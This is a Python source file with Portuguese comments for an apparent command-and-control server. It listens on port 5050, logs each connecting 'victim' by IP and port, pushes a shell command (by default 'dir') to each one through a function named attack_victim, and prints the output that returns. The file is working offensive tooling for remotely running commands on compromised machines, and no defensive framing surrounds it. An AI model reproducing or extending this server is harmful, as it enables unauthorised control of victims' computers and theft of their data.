# 1. nao existe commando pré definido
# 
# 2. quando a vitima se conecta, mostar IP e porta dela
# 
# 3. quando receber a resposta da vitima, o servidor deve imprimir
# os dados

import socket 
import sys
import select

HEADER = 64
PORT = 5050
SERVER = socket.gethostbyname(socket.gethostname())
HOST = ""
ADDR = (HOST, PORT)
FORMAT_UTF = "utf-8"
FORMAT_WINDOWS = "cp1252"

def get_msg(s, address):
  try:
    msg_length = s.recv(HEADER).decode(FORMAT_UTF)
    msg_length = int(msg_length)
    msg = s.recv(msg_length).decode(FORMAT_WINDOWS)
    return msg
  except:
    # remove from active connections
    if s in s_connections:
      s_connections.remove(s)
    print('connecion lost from', address, file=sys.stderr)
    # soh pra ele n rodar infinito no meu pc
    raise

def attack_victim(conn, command, address):
  try:
    conn.sendall(command.encode(FORMAT_UTF))
    print('sending {0} to {1}'.format(command, address), file=sys.stderr)
  except:
    if conn in s_connections:
      s_connections.remove(conn)
    print('connection already lost from', address, file=sys.stderr)
    conn.close()
    # soh pra ele n rodar infinito no meu pc
    raise 

def init():
  # defaults
  global command_attack
  command_attack = "dir"

  # Create a TCP/IP socket
  global server
  server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  server.setblocking(0)
  # printa endereco local do socket do servidor
  print('starting up on {0}'.format(ADDR), file=sys.stderr)
  server.bind(ADDR)

  # Listen for incoming connections
  server.listen(10)

def start():
  # server + active connections
  global s_connections
  s_connections = [ server ]
  global s_pending_attack
  s_pending_attack = []

  while s_connections:
    # Wait for at least one of the sockets to be ready for processing
    print('\nwaiting for the next event', file=sys.stderr)
    # queremos atacar todos os sockets que estao nas conexoes, menos o do server é claro
    readable, writable, exceptional = select.select(s_connections, s_pending_attack, s_connections)

    for s in readable:
      if s is server:
        # A "readable" server socket is ready to accept a connection
        connection, client_address = s.accept()
        # printa a conexao
        print('new connection from:', client_address, file=sys.stderr)
        connection.setblocking(0)
        s_connections.append(connection)
        s_pending_attack.append(connection)
      
      else:
        client_address = s.getpeername()
        data = get_msg(s, client_address)
        if data:
          print('received data from:', client_address)
          print(data)
        else:
          # remove from active connections
          if s in s_connections:
            s_connections.remove(s)
          print('connecion lost from', client_address, file=sys.stderr)

    for s in writable:
      if s is not server:
        client_address = s.getpeername()
        attack_victim(s, command_attack, client_address)
        s_pending_attack.remove(s)

    for s in exceptional:
      client_address = s.getpeername()
      print('handling exceptional condition for', client_address, file=sys.stderr)
      # Stop listening for input on the connection
      s_connections.remove(s)
      s.close()


print("[INIT] server is initializing in {0}...".format(SERVER), file=sys.stderr)
init()
print("[START] server is starting...", file=sys.stderr)
start()